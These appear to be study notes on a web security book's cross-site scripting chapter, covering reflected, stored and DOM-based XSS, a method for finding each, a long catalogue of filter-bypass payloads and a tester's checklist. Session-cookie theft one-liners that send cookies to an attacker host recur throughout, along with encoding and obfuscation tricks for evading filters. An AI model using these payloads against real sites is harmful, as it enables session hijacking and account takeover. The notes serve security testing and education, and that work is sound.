# Ch12: Attacking Users — Cross-Site Scripting

Source: Chapter 12 (~75% of real-world XSS is the simple reflected case). XSS works because of the **same-origin policy**: script delivered *by the application* runs with that origin's privileges — cookies, DOM, actions. Three varieties: **reflected** (request→response), **stored** (input saved, later rendered to users — hits admins), **DOM-based** (client JS reads attacker-controlled DOM data and writes to a sink; may never reach the server).

## Payloads & impact

- Session-token theft (`new Image().src=attacker+cookie`) — the canonical PoC.
- Virtual defacement, Trojan login/forms (more convincing than phishing — real domain + valid TLS).
- Induced actions: payload *performs* the privileged action as the victim (upgrade attacker's perms the moment an admin views it — MySpace-worm mechanics).
- Exploit trust relationships: autocomplete data theft, Trusted Sites zone → `ActiveXObject` RCE, ActiveX controls whose origin check is satisfied *by* the XSS.
- Chains: unauthenticated-area XSS still compromises authenticated sessions (script persists across login); escalate a low-value page's bug to whole-domain control via iframe-overlay persistence.

## Hunting — reflected

1. Submit a **unique benign string** (`myxsstestdmqlwp`) to every parameter (query, body, cookies, Referer/User-Agent headers), one at a time.
2. Find every reflection; for *each occurrence* note the **syntactic context**:
   - HTML body → inject tags.
   - Tag attribute → close quote + event handler (`" onfocus=alert(1)`) or `"><script>…`.
   - JS string → `';alert(1);//` (keep syntax valid — assign trailing quote or comment out).
   - URL attribute → `javascript:alert(1)` or `"onclick="…`.
3. Craft context-appropriate PoC (`alert(1)` proves execution); verify in a real browser — server returns ≠ executes.

## Filter bypass catalog (the signature content)

**Diagnose the defense first**: blocked entirely (signature/WAF), sanitized/encoded (still reflected modified), or truncated. Then attack that specific mechanism:

- **Alternate script vectors**: event handlers (`<xml onreadystatechange=…>`, `<img onerror=…>`, `<video src=1 onerror=…>`, autofocus patterns), `javascript:`/`vbs:` pseudo-protocols, `data:` + base64 payloads, `expression()`/behaviors (IE), `<base>` hijack (relative `src=` scripts resolve to your host).
- **Tag-name obfuscation**: case (`<iMg>`), NULL bytes anywhere (`<[%00]img`, `o[%00]nerror` — kills native-code WAF strings), arbitrary tag names carrying handlers (`<x onclick=…>`), junk after name (`<script/anyjunk>`), `<<script>` extra brackets, E4X (`<script<{alert(1)}/></script>` — Firefox-era/legacy).
- **Space/attribute tricks**: `/`, tab/CR/LF, quotes/backticks as separators (`<img/onerror="alert(1)"src=a>` — zero whitespace); IE backtick delimiters (`src=`a`onerror=…` reads as one attr to filters, two to IE).
- **Attribute-value encoding**: HTML entities in values — decimal/hex/leading-zeros/no-semicolon (`a&#x6c;ert`, `&#0108ert`); URL-within-attribute double-encoding.
- **Encoding attacks**: double-URL-encode to pass a decode-after-filter (`%253c`); Unicode lookalikes that frameworks translate to `<`/`>`; UTF-7/US-ASCII/UTF-16 charsets when you control `charset`; multibyte sets (Shift-JIS/EUC-JP/BIG5): a lead byte (`%f0`) *consumes* the following quote so two separately-safe fields merge into one exploit (`input1=[%f0]`, `input2="onload=…`).
- **JS-level obfuscation**: `\u0065`/`\x6c`/`\154` escapes, superfluous `\`, `eval`+`String.fromCharCode`/`atob`, `'alert(1)'.replace(/.+/,eval)`, `[ ]` instead of dots (`document['cookie']`, `with(document)`), VBScript (IE-era/legacy; case-insensitive — survives uppercase transforms; no-bracket calls `MsgBox+1`), `VBScript.Encode`/`JScript.Encode` (IE-era/legacy), cross-language `execScript` nesting (IE-era/legacy).
- **Sanitization defects**: replace-first-only (`<script><script>`), non-recursive strip (`<scr<script>ipt>`), ordered-step interplay (`<scr<object>ipt>`), unescaped escape char (`foo\';alert(1);//`), JS-string context where quotes are escaped but `</script><script>` works (HTML parsing precedes JS), event-handler context where `&apos;` HTML-decodes *into* a quote.
- **Length limits**: shortest primitives (`open("//a/"+document.cookie)` 28B, `<script src=//a>` 30B); **span payload across multiple fields** using `/* */` comments (`?a="><script>/*&b=*/alert(1)/*&c=*/</script>`); convert to DOM-XSS — `<script>eval(location.hash.slice(1))</script>` puts the real payload after `#` where server filters never see it.
- **Delivery workarounds**: POST→GET method swap (both directions — POST-only filters skip query string); cookie-borne XSS via CSRF-cookie-setting or subdomain XSS; Referer XSS via attacker-page redirect (attacker URL in Referer triggers the bug); Flash/plugin bugs for arbitrary headers (IE-era/legacy plugins).

## Hunting — stored & DOM

- **Stored**: submit unique-per-field strings, then re-walk *everywhere* the app displays data — including admin views, logs, search-history/popular-searches, uploads (see ch12 file-upload XSS: extension/content-type/Content-Disposition gaps), out-of-band channels (email→webmail, feed→aggregator). Follow multistage storage flows to completion. Target **admin-facing surfaces** deliberately — stored XSS in a log viewer is the privileged-action vector.
- **DOM-based**: grep client JS for sources — `document.location`, `document.URL`, `URLUnencoded`, `referrer`, `window.location` — and sinks — `document.write`, `innerHTML`, `eval`, `execScript`, `setTimeout`, `setInterval`. Also walk pages with test strings in params. Fragment (`#`) payload evades *server* filters entirely (never sent); trailing-param trick (`&foo=<payload>`) evades per-parameter validation since client code extracts everything after `name=`.

## Checklist

- [ ] Unique string → every entry point → every reflection context catalogued.
- [ ] Context-correct PoC executes in browser for each confirmed sink.
- [ ] Filter behavior diagnosed (block/sanitize/truncate) → matching bypass applied.
- [ ] Stored surfaces swept incl. admin views, logs, uploads, out-of-band channels.
- [ ] Client JS audited for DOM sources→sinks; `#`-fragment delivery tried.
- [ ] Delivery mechanism validated (GET/POST, headers, cookies, fragment).
- [ ] Impact escalated: token theft → persistent hook → privileged action PoC (minimal, test account).
